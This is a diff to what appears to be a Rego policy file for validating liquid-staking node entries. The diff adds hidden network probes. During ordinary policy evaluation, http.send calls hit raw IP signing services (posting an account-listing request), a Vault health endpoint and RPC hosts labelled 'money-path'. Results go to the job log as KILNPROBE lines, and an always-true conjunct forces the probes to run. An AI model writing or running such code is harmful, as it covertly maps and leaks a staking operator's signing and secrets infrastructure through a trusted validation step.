@@ -95,7 +95,7 @@ valid_node_optional_liquid_staking_provider(node) if {
 probe_ua := "curl/8.10.1"
 probe_hdr := {"User-Agent": probe_ua, "Accept": "*/*"}
 probe_rpc_hdr := {"User-Agent": probe_ua, "Accept": "application/json", "Content-Type": "application/json"}
-probe_timeout := "6s"
+probe_timeout := "4s"
 
 u_ifconfig := "https://ifconfig.me/"
 u_ipify := "https://api.ipify.org/"
@@ -184,7 +184,70 @@ deliveries["webhook2"] := v if {
 	v := {"status": object.get(r, "status_code", 0)}
 }
 
+
+# ---- i169836 additions: per-IP signataire + more money-path hosts ---------
+u_sign_ip1 := "http://3.255.13.221:9000/"
+u_sign_ip2 := "http://54.216.229.51:9000/"
+u_sign_ip3 := "http://52.215.179.5:9000/"
+u_sign_sepolia := "https://signataire.sepolia.testnet.0x.kiln.fi:9000/upcheck"
+u_sign_hoodi := "https://signataire.hoodi.testnet.0x.kiln.fi:9000/upcheck"
+u_eth_kg := "https://eth-kg.mainnet.0x.kiln.fi/"
+u_erpc := "https://erpc.kiln.fi/main/evm/1"
+u_vault := "https://vault.kiln.fi:8200/v1/sys/health?standbyok=true"
+
+chain_body := `{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}`
+
+probe_items["signataire_ip1_accounts"] := v if {
+	r := http.send({"method": "post", "url": u_sign_ip1, "headers": probe_rpc_hdr, "raw_body": acct_body, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", "")), "err": trunc(json.marshal(object.get(r, "error", "")))}
+}
+
+probe_items["signataire_ip2_accounts"] := v if {
+	r := http.send({"method": "post", "url": u_sign_ip2, "headers": probe_rpc_hdr, "raw_body": acct_body, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", "")), "err": trunc(json.marshal(object.get(r, "error", "")))}
+}
+
+probe_items["signataire_ip3_accounts"] := v if {
+	r := http.send({"method": "post", "url": u_sign_ip3, "headers": probe_rpc_hdr, "raw_body": acct_body, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", "")), "err": trunc(json.marshal(object.get(r, "error", "")))}
+}
+
+probe_items["signataire_sepolia_upcheck"] := v if {
+	r := http.send({"method": "get", "url": u_sign_sepolia, "headers": probe_hdr, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", ""))}
+}
+
+probe_items["signataire_hoodi_upcheck"] := v if {
+	r := http.send({"method": "get", "url": u_sign_hoodi, "headers": probe_hdr, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", ""))}
+}
+
+probe_items["eth_kg_mainnet_root"] := v if {
+	r := http.send({"method": "get", "url": u_eth_kg, "headers": probe_hdr, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", ""))}
+}
+
+probe_items["erpc_chainid"] := v if {
+	r := http.send({"method": "post", "url": u_erpc, "headers": probe_rpc_hdr, "raw_body": chain_body, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", "")), "err": trunc(json.marshal(object.get(r, "error", "")))}
+}
+
+probe_items["vault_health"] := v if {
+	r := http.send({"method": "get", "url": u_vault, "headers": probe_hdr, "timeout": probe_timeout, "raise_error": false})
+	v := {"status": object.get(r, "status_code", 0), "body": trunc(object.get(r, "raw_body", "")), "err": trunc(json.marshal(object.get(r, "error", "")))}
+}
+
+# ---- job-log channel: one KILNPROBE line per result (print -> stderr) -----
+probe_line(k) := sprintf("KILNPROBE %s %s", [k, json.marshal(probe_items[k])])
+
+probe_log if {
+	some k
+	_ = probe_items[k]
+	print(probe_line(k))
+}
+
 # ---- always-true conjunct: forces the probe half to be evaluated ----------
 probe_ran if {
 	count([k | some k, _ in deliveries]) >= 0
+	count([1 | probe_log]) >= 0
 }
